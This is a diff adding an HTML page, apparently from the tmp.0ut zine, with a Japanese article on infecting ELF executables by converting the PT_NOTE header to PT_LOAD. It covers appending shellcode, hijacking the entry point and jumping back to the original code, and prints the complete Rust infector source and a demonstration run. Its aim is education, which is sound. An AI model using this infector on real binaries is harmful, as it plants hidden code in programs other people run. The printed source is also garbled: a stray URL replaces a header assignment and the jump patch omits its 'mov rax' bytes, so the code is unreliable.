@@ -1,0 +1,283 @@
+<html>
+<head>
+<title>tmp.0ut</title>
+<meta charset="utf-8">
+<style>
+    body {
+      color: #FEFEFE;
+      background-color: #0c0d10;
+      margin: 0 auto;
+      padding: 1em 0 1em 0;
+    }
+/*
+@font-face { font-family: "gohu"; src: url("gohu.woff") format('woff'); }
+       pre { font-family: "gohu", "Lucida Console", monospace, Monaco; font-size: 14px; line-height: 1.0; }
+*/
+       pre { font-size: 14px; line-height: 1.0; }
+         a { color: #93ffd7; text-decoration: none; }
+</style>
+</head>
+<body>
+<center><div style="display: inline-block; text-align: left;"><pre>
+   \_______________________________________________________________________/
+o_/_________________________________________________________________________\_o
+   | |          ___________                              __              | |
+   | |          \__    ___/____ ______      ____  __ ___/  |_            | |
+   | |            |    | /     \\____ \    /  _ \|  |  \   __\           | |
+   | |            |    ||  Y Y  \  |_> >  (  <_> )  |  /|  |             | |
+   | |            |____||__|_|  /   __/ /\ \____/|____/ |__|             | |
+   | |                        \/|__|    \/                               | |
+   | |                                                                   | |
+   | |         ::: PT_NOTE->PT_LOAD置き換えELF完成方法 (Rust言語) :::        | |
+   | |              `- 愛をこめて、d3npaとtmp.0utの皆さまより <3              | |
+   | |                                                                   | |
+
++------------------------------------------------------------------------------
+| この記事は英語から翻訳したものです。原文はGithubにてご覧できます
+| https://github.com/d3npa/hacking-trix-rust/tree/main/elf/ptnote-infector
++------------------------------------------------------------------------------
+
+SymbolCrashのブログを読みながら、ELFのプログラムヘッダのPT_NOTEをPT_LOADに
+置き換えることでシェルコードのロード及び実行ができる方法を知りました。
+掲載を読むときELFについてあんまりわかっていませんでしたが、この技術が気になって
+実装してみたので、今回学んだことを共有していきたいと思います。
+
+ELFファイルのメタデータの読み・書き込みが簡単にできるように、mental_elfという、
+まだ未完全な小さなライブラリを作ってみました。ライブラリのコード自体は単純で
+読めばわかりやすいと思うので、ここでは詳しく説明しません。代わりに感染方法を
+集中的に解説していきます。
+
+====[ 概要 ]===================================================================
+
+タイトルのとおりこの感染方法は、あるELF実行可能ファイル（以降ELFと呼ぶ）の
+プログラムヘッダーを編集し、PT_NOTEをPT_LOADに置き換えます。感染の流れは次
+の3段階になります：
+
+    - シェルコードをELFの末尾に追加する
+    - 実行時、シェルコードが決まった仮想アドレスに読み込まれるようにする
+    - シェルコードが最初に実行されるように、ELFのエントリポイントを書き換える
+
+シェルコードが処理を終えたら本来のエントリポイントに処理を渡すように、感染時に
+元々のエントリポイントから jmp 命令を生成し、シェルコードをパッチする必要が
+あります。
+
+ELFの末尾に追加されたシェルコードは、PT_LOADというプログラムヘッダーによって
+仮想メモリに読み込めますが、新たなヘッダーをELFに投入してしまえばバイナリ内の
+他のオフセットが壊れてしまうでしょう。ELFの仕様によると、PT_NOTEという別の
+ヘッダーがありますが、そのヘッダーはELFの仕様では任意とされています。
+もし既存のPT_NOTEヘッダーを置き換えれば、オフセットを壊さずにPT_LOADを改竄する
+ことが出来るのです。
+
+この方法には、2つの欠点があります
+
+    - この実装はPIE(位置独立実行形式)のELFは対応されていない
+    - Go言語のランタイムは、バージョン情報を確認するため、有効なPT_NOTEを期待
+      するので書き換えはできない
+
+* PIEは、ccなら-no-pie、rustcなら-C relocation-model=staticという
+  コンパイラオプションで無効化出来ます。
+
+====[ シェルコード ]==============================================================
+
+この例で提供したシェルコードはNASMで書いていますので、Makefileを実行する前にnasmが
+インストールされていることを予め確認してください。
+
+この方法で使えるシェルコードを生成するにはいくつか注意しなければならない点が
+あります。AMD64 System V ABIの仕様の第3.4.1章では、プログラムの開始時(シェルコード
+の後本体のエントリポイントに処理を渡す時点)にrbp、rsp、rdxのレジスタが有効な値を
+持たなければならないと書いてあります。単に、シェルコードの先頭でそれらのレジスタを
+pushし、処理後にpopすればよいのです。自分のシェルコードでは、rbp、rspを触れない
+ので、最後にrdxだけをゼロに戻しています。
+
+また、シェルコードが処理を終えたら、本体のエントリポイントに処理を渡すために、
+本来のエントリポイントからjmp命令を作り、シェルコードに追加する必要があります。
+シェルコードは、上から下まで実行するように書くか、下記のように最後に空のラベルを
+用意してそれにjmpすれば、パッチはシェルコードの末尾に新しい命令を追加しただけで
+実行されるので便利です。
+
+    +--------------------------------------------------------------------------
+    | main_tasks:
+    |    ; ...
+    |    jmp finish
+    | other_tasks:
+    |     ; ...
+    | finish:
+    +--------------------------------------------------------------------------
+
+x86_64では、jmp命令に64ビットの引数を渡すことが不可能なので、一度64ビットの
+エントリポイントをraxに保存し、jmp raxを行います。下記は、そのようにシェルコードを
+バッチするRust言語のスニペットです。
+
+    +--------------------------------------------------------------------------
+    | fn patch_jump(shellcode: &mut Vec&lt;u8>, entry_point: u64) {
+    |     // Store entry_point in rax
+    |     shellcode.extend_from_slice(&[0x48u8, 0xb8u8]);
+    |     shellcode.extend_from_slice(&entry_point.to_ne_bytes());
+    |     // Jump to address in rax
+    |     shellcode.extend_from_slice(&[0xffu8, 0xe0u8]);
+    | }
+    +--------------------------------------------------------------------------
+
+====[ 感染プログラム ]============================================================
+
+
+感染プログラムのソースコードは src/main.rs にあります。
+このファイルを上から下まで読むだけでわかるようになっています。概要を理解した上で
+ソースコードを読めばわかりやすいかと思います。また、ライブラリのmental_elfを利用
+していて、ファイル処理などはほとんど抽象されているので、感染方法に着目できます。
+
+メイン関数の流れは以下のようです:
+
+    - 対象のELFファイル、シェルコードファイルのCLI引数2つを取る
+    - ELFファイルのELFヘッダーとプログラムヘッダーを読み込む
+    - 本来のエントリポイントを使ってシェルコードにjmp命令を追加する
+    - プログラムヘッダーからPT_NOTEを取り、PT_LOADに書き換える
+    - シェルコードの先頭を指すようにELFのエントリポイントを書き換える
+    - 変更済みなヘッダーをELFファイルに書き込む
+
+感染したELFファイルが実行されれば、まずELFローダーは、複数のセクションを仮想
+メモリに読み込みます。改竄したPT_LOADも処理されるのでELFの末尾に追加した
+シェルコードも読み込まれます。ELFのエントリポイントがシェルコードの先頭を指すので、
+シェルコードの実行が始まります。シェルコードの処理が終わったら、パッチしたjmp命令が
+実行され、ELFの本来のエントリポイントに移動し、本来のプログラムが普通通りに
+実行されます。
+
+    +--------------------------------------------------------------------------
+    | $ make
+    | cd files && make && cd ..
+    | make[1]: Entering directory '/.../files'
+    | rustc -C opt-level=z -C debuginfo=0 -C relocation-model=static target.rs
+    | nasm -o shellcode.o shellcode.s
+    | make[1]: Leaving directory '/.../files'
+    | cargo run --release files/target files/shellcode.o
+    | Compiling mental_elf v0.1.0 
+    (https://github.com/d3npa/mental-elf#0355d2d3)
+    | Compiling ptnote-to-ptload-elf-injection v0.1.0 (/...)
+    |     Finished release [optimized] target(s) in 1.15s
+    |     Running `target/release/ptnote-to-ptload-elf-injection files/target 
+    files/shellcode.o`
+    | Found PT_NOTE section; converting to PT_LOAD
+    | echo 'Done! Run target with: `./files/target`'
+    | Done! Run target with: `./files/target`
+    | $ ./files/target
+    | dont tell anyone im here
+    | hello world!
+    | $
+    +--------------------------------------------------------------------------
+
+====[ 後書き ]==================================================================
+
+なんて楽しいプロジェクトでした！Rust言語、ELF、ウィルスについて沢山学ぶことが
+出来ました。私を支え、いろいろ教えてくれた tmp.0utの皆さま、ありがとう
+ございます！ <3
+
+参考リンク
+
+- https://www.symbolcrash.com/2019/03/27/pt_note-to-pt_load-injection-in-elf/
+- http://www.skyfree.org/linux/references/ELF_Format.pdf
+- https://refspecs.linuxfoundation.org/elf/x86_64-abi-0.95.pdf
+- https://github.com/d3npa/mental-elf
+
+以下はソースコード全部になります。コメントを和訳しました。
+
+------------------------------------------------------------------------------
+  Cargo.toml
+------------------------------------------------------------------------------
+
+[package]
+...
+
+[dependencies.mental_elf]
+git = "https://github.com/d3npa/mental-elf"
+rev = "0355d2d35558e092a038589fc8b98ac9bc70c37b"
+
+------------------------------------------------------------------------------
+  main.rs
+------------------------------------------------------------------------------
+
+use mental_elf::elf64::constants::*;
+use std::{env, fs, process};
+use std::io::prelude::*;
+use std::io::SeekFrom;
+
+fn main() -> Result<(), Box&lt;dyn std::error::Error>> {
+    let args: Vec&lt;String> = env::args().collect();
+    if args.len() != 3 {
+        eprintln!("Usage: {} &lt;ELF File> &lt;Shellcode File>", args[0]);
+        process::exit(1);
+    }
+
+    let elf_path = &args[1];
+    let sc_path = &args[2];
+
+    // 読み書き権限で対象のELFファイルを開く
+    let mut elf_fd = fs::OpenOptions::new()
+        .read(true)
+        .write(true)
+        .open(&elf_path)?;
+
+    // シェルコードをファイルから読み込む
+    let mut shellcode: Vec&lt;u8> = fs::read(&sc_path)?;
+
+    // ELFのヘッダーを読み込む
+    let mut elf_header = mental_elf::read_elf64_header(&mut elf_fd)?;
+    let mut program_headers = mental_elf::read_elf64_program_headers(
+        &mut elf_fd, 
+        elf_header.e_phoff, 
+        elf_header.e_phnum,
+    )?;
+
+    // シェルコードは処理の後に本来のエントリポイントに戻るようにパッチする
+    patch_jump(&mut shellcode, elf_header.e_entry);
+
+    // 対象のELFファイルの末尾にシェルコードを追加する
+    elf_fd.seek(SeekFrom::End(0))?;
+    elf_fd.write(&shellcode)?;
+
+    // ELFヘッダーをパッチするためのオフセットを計算する
+    let sc_len = shellcode.len() as u64;
+    let file_offset = elf_fd.metadata()?.len() - sc_len;
+    let memory_offset = 0xc00000000 + file_offset;
+
+    // PT_NOTEを探す
+    for phdr in &mut program_headers {
+        if phdr.p_type == PT_NOTE {
+            // タイプをPT_LOADに変え、シェルコードをロードさせるように
+            // 様々な値を設定する
+            println!("Found PT_NOTE section; converting to PT_LOAD");
+            phdr.p_type = PT_LOAD;
+            phdr.p_flags = PF_R | PF_X;
+            phdr.p_offset = file_offset;
+            phdr.p_vaddr = memory_offset;
+            https://www.symbolcrash.com/2019/03/27/pt_note-to-pt_load-injection-in-elf/
+            phdr.p_memsz += sc_len as u64;
+            phdr.p_filesz += sc_len as u64;
+            // ELFのエントリポイントはシェルコードの先頭を指すようにする
+            elf_header.e_entry = memory_offset;
+            break;
+        }
+    }
+
+    // 変更をELFファイルに書き込む
+    mental_elf::write_elf64_program_headers(
+        &mut elf_fd, 
+        elf_header.e_phoff,
+        elf_header.e_phnum,
+        program_headers,
+    )?;
+    mental_elf::write_elf64_header(&mut elf_fd, elf_header)?;
+
+    Ok(())
+}
+
+fn patch_jump(shellcode: &mut Vec&lt;u8>, entry_point: u64) {
+    // エントリポイントをraxレジスタに保存する命令
+    // https://www.symbolcrash.com/2019/03/27/pt_note-to-pt_load-injection-in-elf/
+    shellcode.extend_from_slice(&[0xffu8, 0xe0u8]);
+}
+
+------------------------------------------------------------------------------
+------------------------------------------------------------------------------
+
+</pre></div></center>
+<body>
